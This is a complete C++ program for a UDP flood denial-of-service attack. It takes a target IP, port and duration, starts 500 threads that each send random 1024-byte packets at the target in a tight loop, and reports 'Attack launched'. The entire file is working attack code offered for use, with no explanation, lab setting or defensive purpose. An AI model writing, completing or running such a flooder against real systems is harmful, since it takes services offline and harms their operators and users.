#include <iostream>
#include <vector>
#include <thread>
#include <string>
#include <random>
#include <chrono>
#include <cstring>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

#define THREAD_COUNT 500
#define PACKET_SIZE 1024

std::vector<uint8_t> generate_payload(int size) {
    std::vector<uint8_t> payload(size);
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 255);
    
    for (auto& byte : payload) {
        byte = dis(gen);
    }
    return payload;
}

void flood(const std::string& ip, int port, int duration, const std::vector<uint8_t>& payload) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket error");
        return;
    }

    struct sockaddr_in target_addr;
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    inet_pton(AF_INET, ip.c_str(), &target_addr.sin_addr);

    auto start = std::chrono::steady_clock::now();
    while (std::chrono::steady_clock::now() - start < std::chrono::seconds(duration)) {
        sendto(sock, payload.data(), payload.size(), 0, 
               (struct sockaddr*)&target_addr, sizeof(target_addr));
    }
    close(sock);
}

int main(int argc, char* argv[]) {
    if (argc < 4) {
        std::cerr << "Usage: " << argv[0] << " <IP> <PORT> <TIME>\n";
        return 1;
    }

    std::string ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);

    std::vector<uint8_t> payload = generate_payload(PACKET_SIZE);
    std::vector<std::thread> threads;

    std::cout << "Attack launched with " << THREAD_COUNT << " threads\n";
    for (int i = 0; i < THREAD_COUNT; ++i) {
        threads.emplace_back(flood, ip, port, duration, std::ref(payload));
    }

    for (auto& t : threads) {
        t.join();
    }

    std::cout << "Attack finished\n";
    return 0;
}